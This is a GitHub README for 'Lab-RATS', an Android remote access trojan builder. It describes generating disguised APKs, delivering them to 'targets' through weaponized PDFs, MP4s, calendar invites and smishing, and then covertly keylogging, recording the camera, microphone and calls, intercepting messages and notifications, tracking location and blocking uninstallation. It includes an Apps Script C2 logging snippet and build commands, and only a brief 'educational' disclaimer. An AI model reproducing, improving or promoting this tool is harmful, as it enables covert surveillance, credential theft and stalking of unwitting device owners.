<p align="center">
<img width="1449" height="504" alt="Screenshot 2026-10-05 at 3 14 37 AM" src="https://github.com/user-attachments/assets/4a758ae8-10a4-4bbf-8485-9d894fb925a5" />


<p align="center">
  <img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
  <img src="https://img.shields.io/badge/Android-SDK_34-green?style=for-the-badge&logo=android&logoColor=white">
  <img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=openaccess&logoColor=white">
  <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
  <br>
  <img src="https://img.shields.io/badge/Network-Direct_IPv6-informational?style=for-the-badge&logo=gitconnected&logoColor=white">
  <img src="https://img.shields.io/badge/Mode-Stealth_FUD-black?style=for-the-badge&logo=ghostfolio&logoColor=white">
  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
</p>

# Lab-RATS - v1.6.0
> Lightweight Android-Built Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*

**Lab-RATS is an open-source, lightweight Android Remote Administration framework** packed with powerful **monitoring** and **interaction capabilities**. The system automates the generation of custom, signed `.apk` files for **deployment onto any Android device**, providing full device telemetry via a **sleek, web-based C2 dashboard**. Built to adapt to **strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across both **legacy** and the **newest Android releases**.

---

## 🌎 Direct IPv6 Access *(P2P connection)*:

**Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely eliminating the need for **router manipulation, port forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
<details>
  <summary>📸 Click to View IPv6 Exploit Vector</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/e77ecfe5-4640-4f15-b462-554cd58e4342" alt="Full Web Page Screenshot" width="50%">
</details>

---

## 🛡️ Core Features & Security

### 🔐 **Remote C2 Security** & **Secure Handshake**:
- The **web dashboard** is **protected by a secure login wall** (**Default Password: admin1337**). The password can be **changed directly from the Terminal home page** for **enhanced security**.
- Implemented a **masked credential handshake**. Passwords are **reversed and Base64 encoded** (`0x_` prefixed) on the client-side before transmission, rendering them **invisible to browser Network/Payload inspectors**.

### 📦 **Automated APK Generation, Identity Control & Density Scaling**:
- **Instantly build** `signed.apk` for **production** and **testing**.
- **Fully** customize **App Name**, **Package ID**, and **Minimum SDK**.
- **Resize logos automatically** for **all Android screen densities**.

### 📱 **PC/Mobile Responsive**:
- The **remote web interface** is **fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for monitoring **from any device**.

---

## 🕵️ Covert Operations & Stealth Management

### 💉 **NEW!** **Payload Delivery Vectors** *(Installing APK onto Target Device)*:
- The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.

### 🛡️ **Evasion Engine**:
-  **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
-  **Deep Stealth HTML Shield**: The C2 interface utilizes **Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser "Elements" inspection is **zeroed-out**, and the tactical structure is **ghosted from analysts**.
-  **Web Hardening**: Assets *(JS/CSS)* are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** *(Right-Click, F12)* to **prevent unauthorized analysis**.
- **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow** and **class names via ProGuard/R8 integration**.
- **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.

### 🎭 **Stealth App Decoys**:
**Remotely swap the entire Lab-RATS app identity and icon instantly** using **the "Masquerade Library"** of convincing **Fully Functional Clones**:
- 👀 **System Update** *(Default)*: **Used for initial install** it **simulates a system update** and **prompts for permissions during the process**, achieving **highly successful installs**.
- 🧮 **Calculator**: Performs **actual math** with a **tactical logic engine**.
- 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
- 🛡️ **Play Protect**: Simulates **a legitimate security scan** to **build target trust**.
- 🐭 **Lab-Rats & System Stability Services**: **Completely unmasked** and **directly opens** the C2 server interface on device.
<details>
  <summary>📸 Click to View Stealth App Decoys</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/f2114dda-1090-4395-add2-6007f48cff8f" alt="Full Web Page Screenshot" width="50%">
</details>

### ☎️ **Emergency Recovery** & **Self Healing**:
- **Dialer Unlock**: Type `*#1337#` on the **phone's keypad** to **unmask the Lab-RATS server interface back into view**.
- **Hidden Backdoor**: If the **device is in stealth mode**, **rapidly tap the middle of the decoy screen 10 times** to **unlock the C2 server interface**. *(Reverts to stealth mode again once app is closed)*
- **Automatically detects** and **repairs damaged service bindings** or **revoked permissions in the background**.
- **Anti-Removal**: **On by default** in the **Ghost Tab**, it **prevents the user from uninstalling** or **force-stopping the app** via Settings.

### 🔄 Remote Server Restart:
- **Web UI**: **One-click "RESTART_SERVER" button** on the **Terminal tab** to **refresh background services**.
- **SMS Backdoor**: Send an **SMS/Text containing `!RESTART_C2`** to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.

### 👻 **Task-List Ghosting** & **Dynamic OTA Camouflage**:
- The app is **hard-coded** to be **invisible in the Android "Recent Apps" list**.
- Generates **random version names and codes** that **mimic legitimate system OTA updates**.

---

## 🚀 Remote Capabilities

### 👻 Ghost_Operations:
- **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
- **Blackout Mode**: A **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **NON-masked live remote feed**. *(Pair with Ghost Control for maximum stealth)*
- **NEW! Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to overwhelm the device.
- **NEW! Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
- **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.

### 🧪 NEW! Exploit_Factory:
- **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
- **QR Visual Vector**: Dedicated **high-density QR code generator** for independent URL delivery.
- **Smishing Library**: Pre-configured **tactical phishing templates** with **automated C2 link injection**.
- **Shadow Overlay**: Remotely **inject functional, pixel-perfect credential-harvesting overlays** to the device.

### 💀 Anti-Removal Shield (Optimized):
- **High-speed, event-driven protection** that **blocks attempts** to **Uninstall** or **Force Stop** the **app**.
- **Suicide Protocol (Self-Destruct)**: **Remote-triggered persistent loop** that **wipes all local configuration** and initiates a **hard uninstallation of the C2 core**.

### 🛰️ Precision GPS Tracking & Intel Stream (Notification Sniffer):
- **One-click uplink** to open the **devices exact real-time location** in **Google Maps**.
- **Intercept every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.

### 📸 Tactical Surveillance Hub (Ultra-Stability):
- **Covert Recording**: **Stealthily record video without any user-facing activity**.
- **Snap Photos**: **Covert image capture** integrated into the **live stream**.
- **Nightmode V2**: Aggressive **electronic brightening** for **low-light environments**. Now features **Hardware Breathe Sync** and **AE Bypass** for **zero-freeze operation** on **modern high-latency sensors**.

### 🎙️ Acoustics & Interception:
- **Timed or Live microphone recording** and **automated call recording** for **both incoming and outgoing calls**.

### 📂 Advanced Data Uplink:
- **Integrated File Manager**: **Navigate, download**, and **manage files**. Features an **instant Search Bar** and **Category Filters**.
- **Info Gathering**: Access **Call Logs**, **Contacts**, **Hardware Analytics**, and **Installed Apps** remotely.
- **📝 Direct File Editor**: **Live-edit text, JSON**, and **log files** directly **on the device**.

### 🖥️ Enhanced Remote Shell:
The **Terminal Tabs Built-in Shell has been overhauled** for **professional workflows**:
- **Command History**: Navigate **previous commands instantly** using **Up/Down arrows**.
- **Modernized Interface**: Updated to `root@Android` prompt with **an updated `help` menu**.
- **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.

### 📊 Telemetry & Reporting:
- **C2 Auto-Reporting**: **Discrete** reporting of **Date & Time, Device Make & Model, Connection Type *(WiFi/Cellular)*, IP Address, Port, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status, and Storage Space** to a centralized **Google Sheet or Render C2**.

---

## 🧠 Native Integration

### 🛠️ Termux Bridge Integration:
**Lab-RATS** now features a **high-performance bridge to the Termux environment**. If **Termux is installed on the target device**, the remote terminal can **instantly elevate its capabilities**:
- **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are **routed through the bridge**.
- **Unrestricted Tools**: **Install** and **run Python scripts, Nmap scans, or Metasploit** from the **C2 web terminal**.
- **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
> [!NOTE]
> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**" (Most Common).
<br>**Solution**: **On the Target Device** open **Termux and run**:
```
echo "allow-external-apps = true" >> ~/.termux/termux.properties
termux-reload-settings
```

---

## 📡 Command & Control (C2) Options

**Lab-RATS** supports **two primary methods** for **tracking your device fleet** and **receiving remote data**.

### ☝🏻 Option 1: Google Sheet (Updated)
**Best for basic IP tracking** and **logging**. **No server maintenance required**.

1.  **Create** a new <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    
    // Auto-initialize headers if new sheet
    if (sheet.getLastRow() == 0) {
      sheet.appendRow([
        "Timestamp", 
        "Model #", 
        "Connection Type", 
        "IP Address", 
        "Port", 
        "Active C2 Link", 
        "Battery", 
        "Stealth Status", 
        "Power", 
        "Free Storage"
      ]);
    }
    
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    
    var row = [
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ];
    
    sheet.appendRow(row);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.

> [!IMPORTANT]
> 4.  **Copy the Webhook URL provided** and **prepare to paste it into the APK-builder tool** when **prompted**. *(Get Started Section Below)*

---

### ✌🏻 Option 2: Tactical Node.js Backend (Advanced)
**Best for professional fleet management** and **Automatic File Exfiltration**.

1.  **Host the Backend**: Use **the source code** in the `/c2-server` directory. You can **host this on platforms** like **Render**, **Railway**, or **your own VPS**.
2.  **Get your URL**: Once your **service is live**, copy the URL (e.g., `https://labrats-c2.onrender.com`).
3.  **Hard-code the Link**: **Enter the Render URL** into the **APK Builder** when **prompted** for the `WEBHOOK_URL`.

**Advantages of Option 2**:
- 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, enabling **seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks**.
- 📂 **Exfiltration Vault**: **Audio/Video recordings** are automatically uploaded and **stored on your server**.
- 📡 **Live Fleet List**: A **professional glass-morphism dashboard** to **manage all "Rats" in one place**.
- 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your P2P links **are always up-to-date**.


---

## 🛠️ Get Started

### 1. Requirements
*   **Java 17 or 21 installed** on your **workstation**.
*   A **Test Android device**. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
*   Your **Google Sheet Webhook URL or Render URL**. *(previous sections above)*

### 2. Building the APK (on PC)
1.  **Download the Repo**: `git clone https://github.com/K4N3CO/Lab-RATS.git`
2.  **Navigate** to: `cd /Lab-RATS/apk-builder/`
3.  **Execute** the **Builder**:
    *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
    *   **Windows**: `build.bat`
4.  **Select a Build Strategy**:
    *   **Option 1 (Manual)**: For **basic configuration** of **App Name, ID**, and **Logo** before **building**.
    *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
5.  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting**.
6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `Lab-RATS/apk-builder/output/` **directory**.

### 3. Deploying & Installing onto Android Devices
**Deployment** is **a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.

#### A. NEW! Strategic Weaponization (The Wrapper)
**Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder`tool to wrap your link inside a **high-compatibility carrier file**:
*   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
*   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
*   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a **weaponized "Security Review" link**.
*   **🔳 QR Code / 📡 NFC**: **Best for physical placement** or **"Tap-to-Infect" proximity delivery**. Generates a **high-density QR** or **NDEF record** pointing to the **hardened delivery URL**.
*   **and Many More**: The **Wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document macros**.

#### B. Hosting Strategies
*   **Anonymous Cloud**: **Option 6** uses **Catbox.moe by default**. It is **anonymous, fast**, and **generates a direct link**. Now includes **fallback upload to Litterbox and tmpfiles** if needed.
*   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from **another infected device** using the `/download/` endpoint.

#### C. Installation & Initialization
Once the **Target device** downloads the **APK**:
1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
    -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
3.  **Self-Vanishing**: A few seconds **after launch, the app will automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **5 seconds of initialization**, the **Device Make & Model, Connection Type, IP Address, Port, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status and Storage Space will appear in the log**.

<details>
  <summary>📸 Click to View Example Google Sheet Reporting</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
</details>

---

## ⭐ Support the Development

**If** you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it **drives further development!!**

### Contributions:
**Bug Reports, Add New Feature** and **Pull Requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*

---

### Donate:
<img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black">

**https://buymeacoffee.com/k4n3co**

<img src="https://img.shields.io/badge/Donate-Bitcoin-F7931A?style=for-the-badge&logo=bitcoin&logoColor=white">

```
bc1q8d66m0qthnh6nw9hc5wl09m7pfydk46q5w8rxx
```

---

## 📸 Screenshots & Video Clips

### APK-Builder Example *(Mac OS)*:

https://github.com/user-attachments/assets/92767769-a141-42ad-a285-481e552d4706

---

### Built APK *(C2 Server)* Installed on Android Device:

<img width="258" height="550" alt="Screenshot 2026-10-05 at 6 47 21 AM" src="https://github.com/user-attachments/assets/63bc22d1-70cb-47c2-b4ed-f99dc0464ab0" />

---

### Lab-RATS Initial Install Sequence & Icon Stealth Preview:

https://github.com/user-attachments/assets/d1b27cb9-24bf-4f7b-8241-f839a9d5c145

---

## Remote Web-Based C2 Dashboard - PC Interface

### Remote C2 Dashboard Clip #1:

https://github.com/user-attachments/assets/21068401-f702-41e9-9e88-01a60d9beed5

### Remote C2 Dashboard Clip #2:

https://github.com/user-attachments/assets/ae0ede50-b58f-4a6d-962d-9cffd429c1af

---

### 01. Terminal Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/920be29b-88bd-4516-82ff-1deb28cce098" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 02. Ghost_Operations Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/25021056-538d-4392-bbf1-e66a2c5873af" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 03. Optics/Live Camera Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/020eff59-9444-4dcd-b987-6c0fbcb6249e" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 04. Locate/Live GPS Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/cae2c596-8551-4dbf-80a3-6a9b4cfec58d" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 05. Exploit_Factory Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/9adc2ea3-9705-4f61-9d47-329f4d17b373" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 06. Device Data/Storage Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/55726a19-c071-405c-afef-ab50f119f3e0" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 07. Intel/App Notifications Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/35c0ff19-fec5-4734-a103-99f260ea7419" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 08. SMS/Text Message Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/bafdc486-fc2b-4399-99c9-2e6e444d8a18" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 09. MMS/Multimedia Message Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/2559606d-6025-416c-99b1-8a78e046d31b" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 10. Acoustics/Audio Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/8b1efce6-1d3b-490c-8d73-9dbde39c2a53" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 11. Comms/Call_Logs Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/53d82189-6cb9-4489-835b-b929624181de" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 12. Contacts Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/9c7336a1-9770-4881-bfcc-3de331812789" alt="Full Web Page Screenshot" width="100%">
</details>

---

### 13. Hardware/Device Info Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/d918e6bf-7b92-42ad-bf17-c38ef1c32615" alt="Full Web Page Screenshot" width="100%">
</details>

---

## ⚠️ Disclaimer

This tool is for **educational and authorized security testing purposes ONLY!**. The **developers & contributors** assume **NO responsibility** for **ANY** **misuse, damage to devices or relationships** caused by this software. **Please use it responsibly**. **Thank you!**

---

## 📄 License

**Lab-RATS** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).

---

<p align="center">
<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind-cyan?style=for-the-badge&logo=maserati&logoColor=white">
<br>
<p align="center">
<img src="https://img.shields.io/badge/Developed By-K4N3CO ©2026-darkred?style=for-the-badge&logo=magisk&logoColor=white">
